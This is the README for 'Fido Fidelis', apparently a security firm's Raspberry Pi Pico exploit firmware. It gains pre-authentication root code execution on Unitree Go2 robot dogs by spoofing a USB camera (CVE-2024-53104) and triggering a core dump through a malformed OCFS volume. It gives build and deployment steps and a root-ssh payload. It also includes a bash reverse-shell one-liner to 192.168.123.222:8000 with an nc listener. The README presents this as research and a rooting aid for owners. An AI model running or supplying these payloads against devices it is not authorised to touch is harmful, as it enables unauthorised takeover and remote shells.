# Fido Fidelis

## Overview

A tiny Raspberry Pi Pico 2 (or Pico) firmware to gain pre-authentication code execution on the Unitree Go2 dog, firmware version v1.1.15.

This firmware uses CVE-2024-53104 and OSS-Fuzz 52270 to first pretend to be a USB camera with fake configuration frames, which ultimately sets the dog's `core_pattern` to our payload, and then uses an issue with how libblkid handles probing Oracle Cluster File System (OCFS) volumes to cause a core dump, triggering our payload.

By default, the payload only places a file at `/unitree/var/data/fido-fidelis-root.txt`. This was chosen so that people with already rooted dogs could trivially show the firmware was working. A somewhat untested full rooting payload is also provided, modeled after how Unleash-Lite does the rooting. Instructions are provided below to create the firmware that will run the full rooting, as well as a script that can theoretically be used to automate the process, once you plug the dog in. There's also a custom payload option, so you can really go wild.

This was developed originally with the Raspberry Pi Pico 2, but has been tested on the Pico as well. Note that the Pico 2 W will *probably* work, but won't have the full functionality. See Usage below for more information. 

All prose and the README.md file were written by Praetorians. The PoC itself is mostly generated by a model.

## Flashing

### Prerequisites
Install the following prerequisites:
 - Raspberry Pi Pico SDK 2.3.0 or greater
 - CMake
 - Ninja
 - arm-none-eabi-gcc
 - Python 3.9 or newer

Set your shell's PICO_SDK_PATH to be where you installed the Pico SDK to.

### Building

Build it the same way you would build any other Pico firmware, or use the integrated `fido.py`.

#### Default proof
`./fido.py build --payload default --board pico2` 

will build the Pico 2 firmware with the default payload, targeting version 1.1.15 of the dog.

#### Rooting 

`./fido.py build --payload root-ssh --board pico` 

will build the (somewhat untested) full root-ssh payload on the Pico, targeting version 1.1.15 of the dog.

#### Custom Payloads
Have your own custom payload?

`./fido.py build --payload command --pattern '|/bin/bash -c /bin/bash${IFS}-i${IFS}>&/dev/tcp/192.168.123.222/8000<&1' --board pico`

This is an example custom payload, but if you do run it, make sure you have `nc -lnvp 8000` up before you plug the Pico in.

Will get a reverse shell, assuming your Ethernet port connected to the dog is that IP address.

### Other Firmware Profiles
If someone submits a profile for other versions of the dog, it can be compiled by incorporating it into a firmware profile (similar to firmware.json) and using: 

`./fido.py build --config go2-X.Y.Z.json --board pico2`


## Usage

The default doesn't need any Ethernet, but is mostly useful for people who have already rooted a dog. For anything that relies on the dog connecting out, you'll need to use an Ethernet cable, and set the interface on your machine to be something like 192.168.123.222 so the dog can reach out to it.

- Grab a Raspberry Pi Pico or Pico2.
- Grab a USB-Micro to USB-C cable, or a USB-A to USB-C dongle. You need to be able to plug the Pico in to the dog.
- Build the relevant firmware as mentioned above.
- Hold the BOOTSEL button down while plugging the Pico in.
- Drag and drop the resulting .uf2 on to the volume that appeared, or use the `picotool` tool (not included) to flash it on to the Pico.
- Make sure the top plate is off of the Unitree Go2 dog, so that the main PCB is exposed.
- With the dog powered off, plug the Pico in.
- Power the dog on.
- Wait for it to fully boot and then enjoy your code running on it.

Don't remove the Pico until the dog is powered off. It doesn't handle that too well.

Fido Fidelis has worked over 95% of the time we tested it. A rare few times it wouldn't run, but you can then just restart the dog and try again. It is more consistent if an Ethernet cable is plugged in and the other end is configured. 

The firmware relies on guessing how many "drains" to perform when trying to get a free object list in the right state. This is the usual cause of the firmware not firing. You can control how many drains occur by editing the config file (`firmware.json` by default) or passing the `--drain` flag in to `fido.py config` when making a new firmware config file. Try other values out!

### Rooting

Fido.py also has the capability to receive the shell from the `root-ssh` payload. After you build the firmware, but before you power the dog on, you can run

`./fido.py root`

will start a listener for the payload that `./fido.py build --payload root-ssh` deploys, and then proceed with rooting the dog. Probably. That part hasn't been tested, but it mirrors how Unleash-Lite does it.

### LED Indicator

The firmware has the status LED of the Pico 2 flash based on what stage the exploit is in. It'll start blinking slowly once it gets power, but once the fake USB camera is enumerated and processed, it'll start blinking rapidly. After a short while, the blinking should stop, then start up again once the fake OCFS is enumerated. The LED is treated as GPIO 25, which will work for both the Pico and Pico 2. The Pico 2 W likely won't be able to flash the LED, because the GPIO used differs.

## Other Profiles

This has only been tested on version 1.1.15 of the Unitree Go2 dog. There's a script at `tools/generate_profile.py` that will make a profile for other versions of the dog but it requires SSH access already. There's a mutually-exclusive option (`--requirements`) to print the info you'd need to make your own profile though.

Once you have the profile file, you can then make a firmware config for it with:

`./fido.py config --profile go2-X.Y.Z` 

or whatever you named the profile.

This can be passed in to `fido.py build` with the `--config <file>` flag. 

### SSH
Run it with `--target-host` to connect over SSH to a specified IP and then enumerate all the necessary info. Include `--name` for what to call it the resulting file.

### Manual Info

If you don't have SSH access, you can run 

`python3 tools/generate_profile.py --requirements` 

to get a list of things necessary to create the profile.

You can copy the format of the existing profile for this.
